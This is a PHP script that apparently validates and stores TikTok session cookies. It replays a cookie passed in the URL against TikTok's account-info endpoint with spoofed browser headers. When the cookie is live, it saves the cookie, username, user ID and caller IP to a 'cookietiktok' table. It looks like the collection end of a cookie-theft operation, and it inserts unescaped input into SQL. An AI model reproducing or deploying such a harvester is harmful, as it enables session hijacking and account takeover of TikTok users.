<?php
date_default_timezone_set("Asia/Ho_Chi_Minh");
$ip = $_SERVER['HTTP_CLIENT_IP']; 
if($ip==""){
$ip = $_SERVER['HTTP_X_FORWARDED_FOR']; }
$cookie=$_GET["cookie"];
function fb($url, $hd){
$o= curl_init();
curl_setopt_array($o, array(
CURLOPT_URL => $url,
CURLOPT_POST => "200",
CURLOPT_CUSTOMREQUEST => "GET",
CURLOPT_RETURNTRANSFER => true,
CURLOPT_ENCODING => "",
CURLOPT_HEADER => true,
CURLOPT_HTTPHEADER => $hd));
$x = curl_exec($o); 
curl_close($o);
return $x;
}
$hd = array(
"Host:www.tiktok.com",
"cache-control:max-age=0",
"sec-ch-ua-mobile:?0",
"upgrade-insecure-requests:1",
"user-agent:Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"sec-fetch-site:cross-site",
"sec-fetch-mode:navigate",
"sec-fetch-user:?1",
"sec-fetch-dest:document",
"accept-language:vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
"cookie: $cookie"
);
$test = fb("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=vi-VN&app_name=tiktok_web&battery_info=0.91&browser_language=vi-VN&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20armv8l&browser_version=5.0%20(X11%3B%20Linux%20x86_64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F109.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_id=7190392243172902402&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=16&is_fullscreen=false&is_page_visible=true&os=linux&priority_region=&referer=&region=VN&screen_height=772&screen_width=360&tz_name=Asia%2FSaigon&webcast_language=vi-VN",$hd);
$a=explode('{"data"',$test)[1];
$b='{"data"'.$a;
$b=json_decode($b, true);
$data=$b["data"];
$msg=$b['message'];
$user_id=$data['user_id'];
$user_id_str=$data['user_id_str'];
$odin_user_type=$data['odin_user_type'];
$sec_user_id=$data['sec_user_id'];
$screen_name=$data['screen_name'];
$avatar_url=$data['avatar_url'];
$description=$data['description'];
$mobile=$data['mobile'];
$email=$data['email'];
$username=$data['username'];
$create_time=$data['create_time'];
$connects=$data['connects'];
if($msg=="error"){
 $age=array("status"=>"$msg","data"=>"Cookie tiktok die");
 echo json_encode($age);
}else{
$age=array("status"=>"$msg", "data"=>array("username"=>"$username","user_id"=>"$user_id"));
echo json_encode($age)."\n";
$date=date("Y-m-d");
require_once 'ketnoi.php';
$them="INSERT INTO `cookietiktok` (`id`, `cookie`, `user_name`, `user_id`, `date`, `ip`) VALUES (NULL, '$cookie', '$username','$user_id','$date','$ip')";
mysqli_query($ketnoi, $them);
}

